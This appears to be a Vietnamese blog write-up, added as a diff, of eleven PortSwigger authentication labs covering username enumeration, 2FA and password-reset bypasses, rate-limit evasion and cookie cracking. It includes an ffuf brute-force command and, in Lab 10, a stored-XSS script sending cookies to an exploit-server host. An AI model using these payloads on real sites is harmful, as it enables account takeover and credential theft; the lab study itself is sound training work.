@@ -1,0 +1,493 @@
+---
+title: "Authentication Labs — PortSwigger Web Security Academy"
+description: "Write-up chi tiết các bài lab về lỗ hổng xác thực (Authentication) trên PortSwigger — bao gồm username enumeration, 2FA bypass, password reset, brute-force protection bypass, cookie cracking và khai thác logic đổi mật khẩu."
+date: "2026-05-22"
+category: "writeup"
+tags: ["authentication", "brute-force", "2fa", "portswigger", "web-security", "burp-suite"]
+thumbnail: ""
+external_link: ""
+---
+
+<Alert type="warning">
+Bài viết này chỉ phục vụ mục đích học tập và nghiên cứu bảo mật. Vui lòng không sử dụng các kỹ thuật này cho mục đích bất hợp pháp.
+</Alert>
+
+## Lab 1: Username enumeration via different responses
+
+Mục tiêu: tìm ra tài khoản người dùng hợp lệ và đăng nhập thành công.
+
+![Overview](/images/writeups/authentication-labs/image1.png)
+
+Trong burp, request POST /login. Thử nhập tài khoản mật khẩu bất kỳ -> sai thông tin đăng nhập.
+
+![Login attempt](/images/writeups/authentication-labs/image2.png)
+
+![Login attempt](/images/writeups/authentication-labs/image3.png)
+
+Brute-force bằng ffuf. Có 2 file chứa tài khoản và mật khẩu phổ biến.
+
+![Wordlists](/images/writeups/authentication-labs/image4.png)
+
+Khi đăng nhập thất bại phản hồi có mã 200.
+
+![Response 200](/images/writeups/authentication-labs/image5.png)
+
+Phản hồi khác 200 = login thành công.
+
+Sử dụng ffuf để brute-force:
+
+```bash
+ffuf -w username.txt:USER -w password.txt:PASS \
+-u https://0ab3000a038d3e7180a2ee9a007300cf.web-security-academy.net/login \
+-X POST \
+-d "username=USER&password=PASS" \
+-H "Cookie: session=47N1qPjE3iUQSPtdOjLxFs0H6HJpeViO" \
+-H "Content-Type: application/x-www-form-urlencoded" \
+-fc 200
+```
+
+Lệnh này gửi lần lượt Post Request, thử tài khoản và mật khẩu, lọc phản hồi khác 200.
+
+![ffuf running](/images/writeups/authentication-labs/image6.png)
+
+![ffuf result](/images/writeups/authentication-labs/image7.png)
+
+Đã tìm ra tài khoản hợp lệ, đăng nhập -> solve lab.
+
+![Login](/images/writeups/authentication-labs/image8.png)
+
+![Solved](/images/writeups/authentication-labs/image9.png)
+
+---
+
+## Lab 2: 2FA simple bypass
+
+Mục tiêu: truy cập thành công tài khoản carlos (có 2FA).
+
+![Overview](/images/writeups/authentication-labs/image10.png)
+
+Thông tin đăng nhập nạn nhân: `carlos`/`montoya`. Không có mail để nhận 2FA.
+
+![Login attempt](/images/writeups/authentication-labs/image11.png)
+
+![Login attempt](/images/writeups/authentication-labs/image12.png)
+
+Thử đăng nhập vào tài khoản của ta để xem cơ chế.
+
+![2FA form](/images/writeups/authentication-labs/image13.png)
+
+Mail chứa mã xác thực. Server liệu có xác thực đủ 2 bước?
+
+Kiểm thử: nhập tài khoản mật khẩu carlos.
+
+![Login carlos](/images/writeups/authentication-labs/image14.png)
+
+Không tìm cách lấy mã 2FA mà truy cập thẳng `/my-account`.
+
+![Bypass success](/images/writeups/authentication-labs/image15.png)
+
+Khai thác thành công, server không kiểm tra mã 2FA!
+
+---
+
+## Lab 3: Password reset broken logic
+
+Mục tiêu: đặt lại mật khẩu và đăng nhập vào carlos.
+
+![Overview](/images/writeups/authentication-labs/image16.png)
+
+Trang web có tính năng đặt lại mật khẩu.
+
+![Forgot password](/images/writeups/authentication-labs/image17.png)
+
+![Forgot password](/images/writeups/authentication-labs/image18.png)
+
+Submit -> gửi đến gmail. Chứa link đặt lại mật khẩu.
+
+![Email link](/images/writeups/authentication-labs/image19.png)
+
+![Reset form](/images/writeups/authentication-labs/image20.png)
+
+Request tương ứng trong burp.
+
+![GET request](/images/writeups/authentication-labs/image21.png)
+
+Nhập mật khẩu mới và gửi.
+
+![POST request with temp-forgot-token](/images/writeups/authentication-labs/image22.png)
+
+Server xác thực bằng `temp-forgot-token`. Kiểm thử: thay đổi token và gửi lại.
+
+![Modified token](/images/writeups/authentication-labs/image23.png)
+
+Thành công! Server không xác thực token -> Broken Access Control.
+
+Thay username thành carlos.
+
+![Change username](/images/writeups/authentication-labs/image24.png)
+
+Khai thác thành công, đăng nhập vào carlos -> solve lab.
+
+![Solved](/images/writeups/authentication-labs/image25.png)
+
+---
+
+## Lab 4: Username enumeration via subtly different responses
+
+Mục tiêu: tìm tài khoản hợp lệ và đăng nhập thành công.
+
+![Overview](/images/writeups/authentication-labs/image26.png)
+
+Phản hồi có độ dài khác nhau với cùng username!
+
+![Different lengths](/images/writeups/authentication-labs/image27.png)
+
+![Different lengths](/images/writeups/authentication-labs/image28.png)
+
+Trường id trong `/analytics` gây bất đối xứng.
+
+![Analytics id](/images/writeups/authentication-labs/image29.png)
+
+Không thể brute-force dựa trên độ dài. Sử dụng Grep-Extract trong burp.
+
+Brute-force Username với intruder.
+
+![Intruder positions](/images/writeups/authentication-labs/image30.png)
+
+![Payload list](/images/writeups/authentication-labs/image31.png)
+
+![Payload config](/images/writeups/authentication-labs/image32.png)
+
+Grep-Extract: bôi đen phần text lỗi.
+
+![Grep extract](/images/writeups/authentication-labs/image33.png)
+
+Tìm thấy phản hồi khác biệt, thiếu dấu chấm.
+
+![Subtle difference](/images/writeups/authentication-labs/image34.png)
+
+Đây là tài khoản hợp lệ. Brute-force mật khẩu.
+
+![Password brute-force](/images/writeups/authentication-labs/image35.png)
+
+![Password brute-force](/images/writeups/authentication-labs/image36.png)
+
+![Result](/images/writeups/authentication-labs/image37.png)
+
+Tìm ra mật khẩu, đăng nhập -> solve lab.
+
+![Solved](/images/writeups/authentication-labs/image38.png)
+
+---
+
+## Lab 5: Username enumeration via response timing
+
+Mục tiêu: tìm tài khoản và đăng nhập thành công.
+
+![Overview](/images/writeups/authentication-labs/image39.png)
+
+Rate limit khi gửi nhiều request.
+
+![Rate limited](/images/writeups/authentication-labs/image40.png)
+
+Server tin tưởng `X-Forwarded-For` -> bypass rate limit.
+
+Header `X-Forwarded-For` thường được sử dụng bởi Load Balancers, Reverse Proxies, WAF để xác định IP gốc của client. Nếu server tin tưởng header này mà không xác thực, ta có thể giả mạo IP để bypass rate limit.
+
+![Bypass success](/images/writeups/authentication-labs/image41.png)
+
+Brute-force với nhiều IP khác nhau qua `X-Forwarded-For`. Dùng pitchfork mode.
+
+Payload set 1 (IP):
+
+![IP payload](/images/writeups/authentication-labs/image42.png)
+
+Payload set 2 (username):
+
+![Username payload](/images/writeups/authentication-labs/image43.png)
+
+Kết quả toàn bộ 200.
+
+![All 200](/images/writeups/authentication-labs/image44.png)
+
+Tìm phản hồi hợp lệ dựa trên thời gian phản hồi, dùng mật khẩu rất dài.
+
+![Timing attack](/images/writeups/authentication-labs/image45.png)
+
+![Timing attack](/images/writeups/authentication-labs/image46.png)
+
+Tìm được username hợp lệ qua response timing.
+
+Brute-force password -> 302.
+
+![Password found](/images/writeups/authentication-labs/image47.png)
+
+![Password found](/images/writeups/authentication-labs/image48.png)
+
+Đăng nhập -> solve lab.
+
+![Solved](/images/writeups/authentication-labs/image49.png)
+
+---
+
+## Lab 6: Broken brute-force protection, IP block
+
+Mục tiêu: tìm mật khẩu carlos và đăng nhập.
+
+![Overview](/images/writeups/authentication-labs/image50.png)
+
+Rate limit khi đăng nhập quá 3 lần.
+
+![Rate limit](/images/writeups/authentication-labs/image51.png)
+
+Đăng nhập lại bằng tài khoản hợp lệ -> reset counter.
+
+![Counter reset](/images/writeups/authentication-labs/image52.png)
+
+![Counter reset](/images/writeups/authentication-labs/image53.png)
+
+Bypass: cứ 3 request sẽ kèm 1 request hợp lệ (peter).
+
+![Pitchfork setup](/images/writeups/authentication-labs/image54.png)
+
+Trong payload, cứ 3 dòng có 1 dòng mật khẩu đúng.
+
+Payload set 1 (username):
+
+![Username payload](/images/writeups/authentication-labs/image55.png)
+
+Payload set 2 (password):
+
+![Password payload](/images/writeups/authentication-labs/image56.png)
+
+Maximum request = 1.
+
+![Throttle](/images/writeups/authentication-labs/image57.png)
+
+![Results](/images/writeups/authentication-labs/image58.png)
+
+Tìm thấy mật khẩu, đăng nhập -> solve lab.
+
+![Solved](/images/writeups/authentication-labs/image59.png)
+
+---
+
+## Lab 7: Username enumeration via account lock
+
+Mục tiêu: tìm tài khoản và đăng nhập.
+
+![Overview](/images/writeups/authentication-labs/image60.png)
+
+Cơ chế khóa tài khoản sau 5 lần sai, chỉ áp dụng cho tài khoản hợp lệ.
+
+Brute-force mỗi payload 5 lần. Dùng Cluster bomb mode.
+
+![Cluster bomb](/images/writeups/authentication-labs/image61.png)
+
+Payload set 1 (username):
+
+![Usernames](/images/writeups/authentication-labs/image62.png)
+
+Payload set 2 (Null payload x5):
+
+![Null payload](/images/writeups/authentication-labs/image63.png)
+
+![Null payload](/images/writeups/authentication-labs/image64.png)
+
+Tìm thấy tài khoản hợp lệ. Brute-force mật khẩu.
+
+![Account found](/images/writeups/authentication-labs/image65.png)
+
+![Password brute-force](/images/writeups/authentication-labs/image66.png)
+
+Tất cả 200 nhưng 1 request có length khác (lỗi logic: vẫn kiểm tra đúng/sai khi tài khoản khóa).
+
+![Different length](/images/writeups/authentication-labs/image67.png)
+
+Đăng nhập -> solve lab.
+
+![Solved](/images/writeups/authentication-labs/image68.png)
+
+---
+
+## Lab 8: 2FA broken logic
+
+Mục tiêu: đăng nhập vào carlos.
+
+Trang web có 2FA. Mã 2FA gửi về email.
+
+![2FA mechanism](/images/writeups/authentication-labs/image69.png)
+
+![Email code](/images/writeups/authentication-labs/image70.png)
+
+Request khi nhập code:
+
+![POST request](/images/writeups/authentication-labs/image71.png)
+
+Dev lưu giá trị user ở client qua tham số `verify` (không qua Session).
+
+![Verify parameter](/images/writeups/authentication-labs/image72.png)
+
+Thay `verify` thành carlos -> server xử lý `mfa-code` dưới danh nghĩa carlos.
+
+![Modified verify](/images/writeups/authentication-labs/image73.png)
+
+`mfa-code` chỉ 4 chữ số -> brute-force.
+
+![Intruder setup](/images/writeups/authentication-labs/image74.png)
+
+![Payload list](/images/writeups/authentication-labs/image75.png)
+
+Tìm `mfa-code` qua phản hồi 302 -> solve lab.
+
+![Solved](/images/writeups/authentication-labs/image76.png)
+
+---
+
+## Lab 9: Brute-forcing a stay-logged-in cookie
+
+Mục tiêu: đăng nhập vào carlos.
+
+Trang web duy trì đăng nhập bằng cookie.
+
+![Stay logged in](/images/writeups/authentication-labs/image77.png)
+
+Tick "Stay logged in" -> server trả về cookie.
+
+Cookie `stay-logged-in` khác với `session` cookie. Session cookie thường hết hạn khi đóng trình duyệt, còn `stay-logged-in` cookie duy trì phiên đăng nhập lâu dài.
+
+![Cookies](/images/writeups/authentication-labs/image78.png)
+
+Cookie là base64, giải mã:
+
+![Decoded](/images/writeups/authentication-labs/image79.png)
+
+32 bit = MD5. Băm "peter" để kiểm tra.
+
+![MD5 match](/images/writeups/authentication-labs/image80.png)
+
+Logic: Cookie = `Base64(username + ":" + MD5(password))`
+
+Brute-force cookie thay vì form (có rate-limit).
+
+![Intruder setup](/images/writeups/authentication-labs/image81.png)
+
+![Password list](/images/writeups/authentication-labs/image82.png)
+
+Payload processing: MD5.
+
+![MD5 processing](/images/writeups/authentication-labs/image83.png)
+
+Add prefix `carlos:`.
+
+![Prefix](/images/writeups/authentication-labs/image84.png)
+
+Base64 encode.
+
+![Base64](/images/writeups/authentication-labs/image85.png)
+
+![Results](/images/writeups/authentication-labs/image86.png)
+
+![Results](/images/writeups/authentication-labs/image87.png)
+
+Tìm ra cookie hợp lệ -> solve lab.
+
+![Solved](/images/writeups/authentication-labs/image88.png)
+
+---
+
+## Lab 10: Offline password cracking
+
+Mục tiêu: đăng nhập vào carlos và xóa tài khoản.
+
+Trang web lưu phiên bằng cookie "Stay logged in".
+
+![Overview](/images/writeups/authentication-labs/image89.png)
+
+![Overview](/images/writeups/authentication-labs/image90.png)
+
+![Request](/images/writeups/authentication-labs/image91.png)
+
+`HttpOnly` chỉ bật cho `session`, không bật cho `stay-logged-in` -> JS đọc được qua `document.cookie`.
+
+![HttpOnly](/images/writeups/authentication-labs/image92.png)
+
+Có thể đánh cắp cookie nếu trang web thực thi được JS.
+
+Chức năng cmt bị lỗi Stored XSS.
+
+![XSS](/images/writeups/authentication-labs/image93.png)
+
+![XSS](/images/writeups/authentication-labs/image94.png)
+
+Cmt script để đánh cắp cookie:
+
+```html
+<script>
+document.location = 'https://exploit-<YOUR-ID>.exploit-server.net/stolen?' + document.cookie;
+</script>
+```
+
+Carlos vào cmt, bị dính XSS, cookie gửi về máy chủ ta.
+
+![Stolen cookie](/images/writeups/authentication-labs/image95.png)
+
+Cookie là base64.
+
+![Decoded](/images/writeups/authentication-labs/image96.png)
+
+MD5 hash -> brute-force bằng hashcat.
+
+![Hashcat](/images/writeups/authentication-labs/image97.png)
+
+Tìm ra mật khẩu: `onceuponatime`.
+
+Đăng nhập vào carlos, xóa tài khoản -> solve lab.
+
+![Solved](/images/writeups/authentication-labs/image98.png)
+
+---
+
+## Lab 11: Password brute-force via password change
+
+Mục tiêu: đăng nhập vào carlos.
+
+Chức năng lấy lại mật khẩu.
+
+![Change password](/images/writeups/authentication-labs/image99.png)
+
+Request kiểm tra 2 việc: mật khẩu hiện tại đúng? và 2 lần nhập mật khẩu mới khớp?
+
+![Request](/images/writeups/authentication-labs/image100.png)
+
+Thông báo lỗi khác nhau:
+
+- Mật khẩu hiện tại sai: `"Current password is incorrect"`
+- Mật khẩu đúng nhưng mới không khớp: `"New passwords do not match"`
+
+![Different errors](/images/writeups/authentication-labs/image101.png)
+
+![Different errors](/images/writeups/authentication-labs/image102.png)
+
+Brute-force mật khẩu hiện tại, cố tình để new passwords khác nhau.
+
+![Intruder setup](/images/writeups/authentication-labs/image103.png)
+
+![Payload](/images/writeups/authentication-labs/image104.png)
+
+Grep rule: `"New passwords do not match."`.
+
+![Grep match](/images/writeups/authentication-labs/image105.png)
+
+![Grep match](/images/writeups/authentication-labs/image106.png)
+
+Tìm thấy mật khẩu carlos, đăng nhập -> solve lab.
+
+![Solved](/images/writeups/authentication-labs/image107.png)
+
+---
+
+## Tham khảo
+
+- [PortSwigger — Authentication Vulnerabilities](https://portswigger.net/web-security/authentication)
+- [PortSwigger — Authentication Labs](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses)
